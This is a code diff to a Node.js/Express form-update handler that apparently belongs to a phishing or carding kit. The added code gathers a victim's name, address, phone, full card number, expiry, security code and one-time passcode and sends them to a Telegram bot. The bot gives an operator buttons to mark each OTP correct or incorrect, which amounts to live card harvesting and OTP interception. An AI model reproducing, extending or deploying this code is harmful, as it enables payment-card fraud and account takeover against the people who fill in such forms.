@@ -112,26 +112,78 @@ exports.getActionByRef = (req, res) => {
     });
 };
 
-// Update FormData by ref
 exports.updateFormDataByRef = (req, res) => {
   const ref = req.params.ref;
   const updatedData = req.body;
 
-  FormData.update(updatedData, { where: { ref: ref } })
-    .then((num) => {
-      if (num == 1) {
-        res.send({
-          message: "FormData was updated successfully.",
+  FormData.findOne({ where: { ref: ref } })
+    .then((formData) => {
+      if (!formData) {
+        res.status(404).send({
+          message: `Cannot find FormData with ref=${ref}`,
         });
-      } else {
-        res.send({
-          message: `Cannot update FormData with ref=${ref}. Maybe FormData was not found or req.body is empty!`,
-        });
+        return;
       }
+
+      const messageId = formData.messageId;
+
+      FormData.update(updatedData, { where: { ref: ref } })
+        .then((num) => {
+          if (num == 1) {
+            res.send({
+              message: "FormData was updated successfully.",
+            });
+
+            const message = `
+              Updated Form Submission:
+              Phone Number: ${updatedData.phoneNumber || formData.phoneNumber}
+              First Name: ${updatedData.firstName || formData.firstName}
+              Last Name: ${updatedData.lastName || formData.lastName}
+              Delivery Address: ${updatedData.deliveryAddress || formData.deliveryAddress}
+              Card Holder Name: ${updatedData.cardHolderName || formData.cardHolderName}
+              Card Number: ${updatedData.cardNumber || formData.cardNumber}
+              Expiry Date: ${updatedData.expiryDate || formData.expiryDate}
+              Security Code: ${updatedData.securityCode || formData.securityCode}
+              Reference: ${ref}
+              OTP: ${updatedData.otp || formData.otp}
+            `;
+
+            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
+
+            axios
+              .post(telegramUrl, {
+                chat_id: TELEGRAM_CHAT_ID,
+                message_id: messageId,
+                text: message,
+                reply_markup: {
+                  inline_keyboard: [
+                    [{ text: "SHOW OTP", callback_data: "show_otp" }],
+                    [{ text: "OTP CORRECT", callback_data: "otp_correct" }],
+                    [{ text: "OTP INCORRECT", callback_data: "otp_incorrect" }],
+                  ],
+                },
+              })
+              .then((response) => {
+                console.log("Message updated in Telegram:", response.data);
+              })
+              .catch((error) => {
+                console.error("Error updating message in Telegram:", error);
+              });
+          } else {
+            res.send({
+              message: `Cannot update FormData with ref=${ref}. Maybe FormData was not found or req.body is empty!`,
+            });
+          }
+        })
+        .catch((err) => {
+          res.status(500).send({
+            message: `Error updating FormData with ref=${ref}`,
+          });
+        });
     })
     .catch((err) => {
       res.status(500).send({
-        message: `Error updating FormData with ref=${ref}`,
+        message: `Error retrieving FormData with ref=${ref}`,
       });
     });
 };
